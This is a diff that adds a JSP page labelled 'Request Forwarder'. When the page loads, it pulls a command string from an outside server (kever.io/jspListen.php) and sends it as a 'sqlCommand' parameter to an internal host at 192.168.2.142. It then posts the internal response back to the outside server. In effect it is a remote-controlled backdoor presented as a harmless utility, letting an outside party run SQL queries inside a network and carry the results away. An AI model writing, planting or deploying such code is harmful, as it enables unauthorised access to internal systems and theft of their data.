@@ -1,0 +1,52 @@
+<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.OutputStreamWriter, java.io.PrintWriter, java.io.StringWriter, java.net.HttpURLConnection, java.net.URL" %>
+<%@ page import="java.util.stream.Collectors" %>
+<html>
+<head>
+    <title>Request Forwarder</title>
+</head>
+<body>
+    <h1>Request Forwarder</h1>
+    <%
+        try {
+            // Step 1: Make GET request to https://kever.io/jspListen.php
+            URL url1 = new URL("https://kever.io/jspListen.php");
+            HttpURLConnection connection1 = (HttpURLConnection) url1.openConnection();
+            connection1.setRequestMethod("GET");
+            BufferedReader in1 = new BufferedReader(new InputStreamReader(connection1.getInputStream()));
+            String initialResponse = in1.lines().collect(Collectors.joining());
+            in1.close();
+
+            // Step 2: Use the output from the first request as the sqlCommand parameter in the second GET request
+            String encodedSqlCommand = java.net.URLEncoder.encode(initialResponse, "UTF-8");
+            URL url2 = new URL("http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=" + encodedSqlCommand);
+            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
+            connection2.setRequestMethod("GET");
+            BufferedReader in2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
+            String secondResponse = in2.lines().collect(Collectors.joining());
+            in2.close();
+
+            // Step 3: POST the result of the second request back to https://kever.io/jspListen.php
+            URL url3 = new URL("https://kever.io/jspListen.php");
+            HttpURLConnection connection3 = (HttpURLConnection) url3.openConnection();
+            connection3.setRequestMethod("POST");
+            connection3.setDoOutput(true);
+            OutputStreamWriter writer = new OutputStreamWriter(connection3.getOutputStream());
+            writer.write("result=" + java.net.URLEncoder.encode(secondResponse, "UTF-8"));
+            writer.flush();
+            writer.close();
+            BufferedReader in3 = new BufferedReader(new InputStreamReader(connection3.getInputStream()));
+            String postResponse = in3.lines().collect(Collectors.joining());
+            in3.close();
+
+            // Display the final response
+            out.println("Final response from POST: " + postResponse);
+        } catch (Exception e) {
+            // Convert JspWriter to PrintWriter
+            StringWriter sw = new StringWriter();
+            PrintWriter pw = new PrintWriter(sw);
+            e.printStackTrace(pw);
+            out.println(sw.toString());
+        }
+    %>
+</body>
+</html>
